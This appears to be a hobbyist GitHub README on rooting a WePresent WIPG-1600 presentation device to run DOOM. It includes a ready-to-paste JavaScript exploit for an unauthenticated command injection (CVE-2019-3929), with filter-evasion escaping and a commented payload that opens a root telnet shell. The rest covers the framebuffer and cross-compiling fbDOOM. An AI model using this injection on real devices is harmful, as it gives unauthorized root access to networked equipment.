# WePresent_WIPG-1600_DOOM
Hacking the WePresent WIPG 1600 wireless presentation device to get persistent root shell and run DOOM

[doom.webm](https://github.com/user-attachments/assets/bd86eedd-ffbc-4ae9-aa7f-9b46f52858b6)

**-- End of Life 2022 --** </br>
https://www.barco.com/en/support/wepresent-wipg-1600

**-- CVE 2019-3929 Exploit Used** --</br>
https://www.exploit-db.com/exploits/47924



## JS exploit version

Connect to the WePresent's web server, unauthenticated, and paste this into the browser console
```js
// Spawn telnet shell on port 1337 '/usr/sbin/telnetd -p 1337 -l /bin/ash'
let COMMAND = 'ping 192.168.0.100 -c 1';
let DEVICEURL = 'https://192.168.0.110';

// Replaces problematic characters with built-in identifiers
function filterChars(cmd) {
  return cmd.replace(/;/g, 'Pa_Note').replace(/\+/g, 'Pa_Add').replace(/&/g, 'Pa_Amp');
}

fetch(DEVICEURL + "/cgi-bin/file_transfer.cgi", {
  "headers": {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "file_transfer=new&dir='Pa_Amp" + filterChars(COMMAND) + "'",
  "method": "POST",
}).then(response => response.text())
  .then(text => console.log(text))
  .catch(err => console.error("Error: ", err));
```
---

## Output
**whoami example**

<img width="602" height="288" alt="whoami injection" src="https://github.com/user-attachments/assets/8572db93-6663-46dd-b868-66f5bd44dfde" /></br>

**ping example**

<img width="605" height="311" alt="ping lan device" src="https://github.com/user-attachments/assets/5260b482-37ac-4535-b124-4af6db70c61b" />

---

## What's inside

Many embedded devices output video using the **framebuffer**, which lets userspace programs write pixels directly into graphics memory via `/dev/fbX`

Find which process is currently holding `/dev/fb0`:

```bash
$ fuser /dev/fn0 # Find which processes are using the framebuffer.
2262
$ ps | grep 2262
2262 root      225m S    /mnt/scdecapp -qws
```

To run `fbdoom`, it must be the **only** process using the framebuffer.



## scdecapp (Qt display driver)
<img width="1760" height="90" alt="image" src="https://github.com/user-attachments/assets/606c3da0-ebc8-43ea-8d4c-67a4153bded6" />

`scdecapp` is the main Qt-based executable responsible for video output / screensharing / media rendering.

- Do not kill it directly, it will crash the device
- Use the device’s stop script instead `/mnt/wpsd/stopWPSD.sh`

Once `scdecapp` is stopped cleanly, you should be able to claim the framebuffer for fbdoom.

## fbDoom

This uses the excellent fbDOOM project by maximevince:

https://github.com/maximevince/fbDOOM

We build a statically linked ELF that can be cross-compiled for ARMv6.

## CPU Info

```bash
$ cat /proc/cpuinfo
Processor       : ARMv6-compatible processor rev 7 (v6l)
BogoMIPS        : 532.24
Features        : swp half thumb fastmult vfp edsp java
CPU implementer : 0x41
CPU architecture: 7
CPU variant     : 0x0
CPU part        : 0xb76
CPU revision    : 7
```

## Cross-Compilation

Build fbDOOM (static, no SDL):

```bash
$ sudo apt-get update
$ sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi

$ git clone https://github.com/maximevince/fbDOOM
$ cd fbDOOM/fbdoom
$ make clean
$ make NOSDL=1 CROSS_COMPILE=arm-linux-musleabi- CFLAGS="-O2 -pipe -march=armv6 -mfpu=vfp -mfloat-abi=softfp" LDFLAGS="-static"
```

## Installation & Running

The file can be transferred via the busybox ftpd server or USB flash storage FAT32 formatted. Note: this will also require a **[WAD file](https://github.com/Gaytes/iwad)**
```bash
mount -o remount,rw / # Re-mount as write/read and ensure execution status 
chmod+x fbdoom
```

For a standard 1920x1080 screen I recommend the following settings for performance:
```bash
fbset -g 1920 1080 1920 1080 16 -accel true # sets the fb geometry, color depth, and hardware acceleration. BPP can only be 16 or 32
fbdoom -iwad doom.wad -scaling 3 -bpp 16 # Render 320x200 * scaling
```

## Enjoy

The WePresent natively recognizes USB HID and so fbDOOM will pick them up immediately if plugged in. Did not try Gamepads/joysticks


## Firmware dump

https://github.com/dc336/FirmwareDumps/blob/main/WePresent_WIPG1600w.bin

